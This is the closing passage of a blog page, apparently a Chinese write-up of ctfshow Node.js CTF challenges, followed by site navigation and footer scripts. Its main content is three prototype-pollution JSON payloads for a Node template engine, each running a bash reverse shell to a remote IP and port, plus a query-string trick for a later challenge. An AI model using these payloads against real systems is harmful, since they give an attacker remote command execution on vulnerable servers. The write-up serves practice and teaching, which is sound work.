+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;console.log(global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/91.67.943.121/6666 0&gt;&amp;1\&quot;&#x27;))&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Nu1L战队搜到的一条链,可惜也失败了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;self&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;2,jade_debug[0].filename));return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/91.67.943.121/6666 0&gt;&amp;1\&quot;&#x27;);//&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>分割线,2.22来填坑了.</p>
+<p>payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/91.67.943.121/6666 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload分析过程:</p>
+<p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/</a></p>
+<h2 id="344-nodejs特性"><a href="#344-nodejs特性" class="headerlink" title="344 nodejs特性"></a>344 nodejs特性</h2><p>参考羽师傅wp <a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111780832">https://blog.csdn.net/miuzzx/article/details/111780832</a></p>
+<p> ?query={“name”:”admin”&amp;query=”password”:”%63tfshow”&amp;query=”isVIP”:true}</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web334-little-trick"><span class="toc-number">1.</span> <span class="toc-text">web334 little trick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web335-rce"><span class="toc-number">2.</span> <span class="toc-text">web335 rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web336-rce-bypas"><span class="toc-number">3.</span> <span class="toc-text">web336 rce bypas</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web337-js%E6%95%B0%E7%BB%84"><span class="toc-number">4.</span> <span class="toc-text">web337 js数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web338-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-merage"><span class="toc-number">5.</span> <span class="toc-text">web338 原型链污染 merage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web339-RCE"><span class="toc-number">6.</span> <span class="toc-text">web339 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web340"><span class="toc-number">7.</span> <span class="toc-text">web340</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web341-ejs-RCE"><span class="toc-number">8.</span> <span class="toc-text">web341 ejs RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#342"><span class="toc-number">9.</span> <span class="toc-text">342</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#344-nodejs%E7%89%B9%E6%80%A7"><span class="toc-number">10.</span> <span class="toc-text">344 nodejs特性</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://l0nnnaruu.github.io/2021/02/15/nodejs/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&text=ctfshow web入门 Node WP"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&is_video=false&description=ctfshow web入门 Node WP"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow web入门 Node WP&body=Check out this article: http://l0nnnaruu.github.io/2021/02/15/nodejs/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&name=ctfshow web入门 Node WP&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    版权所有 &copy; 2021 L0nm4r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">归档</a></li><li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'lonmar-cn-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
